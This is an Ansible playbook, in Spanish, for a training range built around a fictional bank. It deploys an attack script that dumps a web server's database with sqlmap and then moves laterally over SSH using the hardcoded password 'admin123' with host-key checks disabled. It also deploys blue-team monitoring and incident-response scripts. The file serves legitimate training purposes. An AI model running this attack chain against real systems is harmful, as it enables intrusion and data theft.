- name: "Configurar attack-ws para el ataque"
  hosts: attack-ws
  gather_facts: yes
  become: yes
  tasks:
    - name: "Obtener IPs de los servidores"
      ansible.builtin.set_fact:
        web_srv_ip: "{{ hostvars['web-srv']['ansible_default_ipv4']['address'] | default('10.0.0.3') }}"
        db_srv_ip: "{{ hostvars['db-srv']['ansible_default_ipv4']['address'] | default('10.0.0.4') }}"
        core_bank_ip: "{{ hostvars['core-bank']['ansible_default_ipv4']['address'] | default('10.0.0.5') }}"

    - name: "Crear script de ataque SQL Injection"
      ansible.builtin.copy:
        dest: /opt/sql_injection_attack.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Ataque SQL Injection - Banco del Sol
          # ADVERTENCIA: Solo para fines educativos

          WEB_SRV="{{ web_srv_ip }}"
          DB_SRV="{{ db_srv_ip }}"
          CORE_BANK="{{ core_bank_ip }}"

          echo "============================================"
          echo "  ATAQUE SQL INJECTION - BANCO DEL SOL"
          echo "============================================"
          echo ""

          # Fase 1: Reconocimiento
          echo "[*] Fase 1: Reconocimiento del servidor web..."
          curl -s "http://$WEB_SRV/" | head -20
          echo ""

          # Fase 2: SQL Injection con sqlmap
          echo "[*] Fase 2: Explotando SQL Injection..."
          sqlmap -u "http://$WEB_SRV/buscar?cedula=1" --batch --dump-all --threads=1 2>/dev/null

          echo ""
          echo "[*] SQL Injection completada"
          echo ""

          # Fase 3: SSH a db-srv con credenciales extraidas
          echo "[*] Fase 3: Movimiento lateral a db-srv..."
          sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@$DB_SRV 'echo "Conexion SSH exitosa a db-srv"; cat /etc/hostname'

          # Fase 4: Plantar bandera en core-bank
          echo "[*] Fase 4: Movimiento lateral a core-bank..."
          sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@$CORE_BANK 'echo "Conexion SSH exitosa a core-bank"; cat /home/admin/flag.txt'

          echo ""
          echo "============================================"
          echo "  ATAQUE COMPLETADO"
          echo "============================================"

    - name: "Crear script de monitoreo para blue-team"
      ansible.builtin.copy:
        dest: /opt/monitor_intrusion.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Monitor de Intrusion - Banco del Sol
          # Detecta actividad sospechosa de movimiento lateral

          echo "=== Monitor de Intrusion - Banco del Sol ==="
          echo "Presione Ctrl+C para detener"
          echo ""

          while true; do
            # Verificar logs de nginx en web-srv
            echo "--- Logs de nginx (ultimas 10 lineas) ---"
            ssh admin@{{ web_srv_ip | default('10.0.0.3') }} "tail -10 /var/log/nginx/banco_access.log" 2>/dev/null

            # Verificar logs de PostgreSQL en db-srv
            echo "--- Logs de PostgreSQL (ultimas 10 lineas) ---"
            ssh admin@{{ db_srv_ip | default('10.0.0.4') }} "tail -10 /var/log/postgresql/postgresql-*-main.log" 2>/dev/null

            # Verificar conexiones SSH activas
            echo "--- Conexiones SSH activas ---"
            for host in {{ web_srv_ip | default('10.0.0.3') }} {{ db_srv_ip | default('10.0.0.4') }} {{ core_bank_ip | default('10.0.0.5') }}; do
              echo "  Host: $host"
              ssh admin@$host "who; last -5" 2>/dev/null
            done

            sleep 30
          done

    - name: "Crear script de respuesta a incidente"
      ansible.builtin.copy:
        dest: /opt/incident_response.sh
        mode: "0755"
        content: |
          #!/bin/bash
          # Respuesta a Incidente - Intrusion
          # Banco del Sol

          echo "============================================"
          echo "  RESPUESTA A INCIDENTE - INTRUSION"
          echo "============================================"
          echo ""

          # Fase 1: Bloquear IP del atacante
          echo "[*] Fase 1: Bloqueando IP del atacante..."
          ATTACKER_IP=$(ssh admin@{{ web_srv_ip | default('10.0.0.3') }} "grep 'POST.*buscar' /var/log/nginx/banco_access.log | awk '{print $1}' | sort -u | head -1" 2>/dev/null)
          echo "  IP del atacante: $ATTACKER_IP"

          # Fase 2: Revocar credenciales
          echo "[*] Fase 2: Revocando credenciales comprometidas..."
          echo "  Cambiando contrasena de dbadmin en PostgreSQL..."
          ssh admin@{{ db_srv_ip | default('10.0.0.4') }} "sudo -u postgres psql -c \"ALTER USER dbadmin PASSWORD 'NuevaContrasena2026!';\"" 2>/dev/null

          # Fase 3: Corregir vulnerabilidad
          echo "[*] Fase 3: Corrigiendo vulnerabilidad SQL Injection..."
          echo "  Implementar consultas parametrizadas en Flask"

          echo ""
          echo "[+] Fase de contencion completada"
